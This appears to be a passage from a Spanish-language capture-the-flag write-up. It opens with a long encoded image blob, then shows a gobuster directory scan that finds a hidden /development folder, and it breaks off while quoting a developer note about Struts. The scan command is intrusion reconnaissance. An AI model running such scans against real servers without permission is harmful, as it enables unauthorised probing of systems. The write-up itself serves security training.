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)
*Captura 1: Captura de pantalla 2026-09-22 194142.png*

---

## Enumeración Web

<h3>Reconocimiento de Directorios y respondiendo a la pregunta "What is the name of the hidden directory on the web server?"</h3><h4><strong>Directorios encontrados:</strong></h4><pre><code>gobuster dir -u http://&lt;TARGET_IP&gt; -w /usr/share/wordlists/dirb/common.txt</code></pre><p>Respuesta:</p><ul><li><p>development (Status: 301) [Size: 318]</p></li></ul><h3>Revisando /development</h3><p>Se encontraron dos archivos <code>.txt</code>:</p><h4>dev.txt</h4><pre><code>2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be 